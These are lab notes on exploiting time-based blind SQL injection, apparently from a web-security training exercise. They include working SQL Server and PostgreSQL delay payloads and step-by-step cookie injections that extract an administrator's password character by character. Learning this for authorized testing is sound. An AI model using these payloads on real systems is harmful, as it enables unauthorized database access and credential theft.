# Exploiting blind SQL injection by triggering time delays

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server,
you can use the following to test a condition and trigger a delay depending on whether the expression is true:
```bash
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```
```bash
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
1) The first of these inputs does not trigger a delay, because the condition `1=2` is false.
2) The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:
```bash
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
## Basic Lab
1) Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie
2) Modify the TrackingId cookie, changing it to: <br> `TrackingId=x'||pg_sleep(10)--`
3) Submit the request and observe that the application takes 10 seconds to respond.

# Main Lab

1) Confirm time delat sql injection:<br> `TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
2) Confirm there is user called administrator:<br> `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
3) Confirm characters of password:<br> `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` <br> Condition should be true password has more character than 1
4) Continue it using burp intruder
5) Now to find content of password we will use this payload: <br> `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` <br> then we will change `(password,2,1)='$a$)` to find second character of password and so on.

Perfect explanation on you tube: https://youtu.be/L2e6wrNj4BA
